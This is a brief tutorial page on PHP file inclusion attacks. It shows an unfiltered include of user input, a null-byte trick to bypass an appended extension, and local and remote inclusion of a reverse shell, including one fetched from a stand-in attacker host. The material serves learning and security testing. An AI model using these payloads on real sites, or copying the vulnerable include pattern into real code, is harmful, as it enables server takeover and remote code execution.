# Files/Paths exploits

<hr class="sl">

## File inclusion

<div class="row row-cols-md-2"><div>

Files inclusion refer to websites that are importing <small>(`import/require` in PHP)</small> a file using the user input. For instance: `http://malicious.site/?lang=FR` that is doing a include using `$_GET["lang"]`.

In the following include with no filtering, we may enter a path 

```php
include "$_GET[lang].php"
```

**PHP < 5.3.4**: if the programmer appended an extension, such as `.php`, but you want to bypass it, you can use the **Null Byte** `%00` which indicates the end of a string.

```php
include "xxx.elf%00.php" // include xxx.elf
```

</div><div>

**Local File Inclusion (LFI)** 🏠: inject a local file

```php
// you uploaded a reverse shell as your avatar
include "./uploads/avatar.png.php"
```

**Remote File Inclusion (RFI)** ✈️: inject a remote file

```php
// allow_url_fopen MUST BE SET TO true
include "http://malicious.site/reverse_shell.php"
```
</div></div>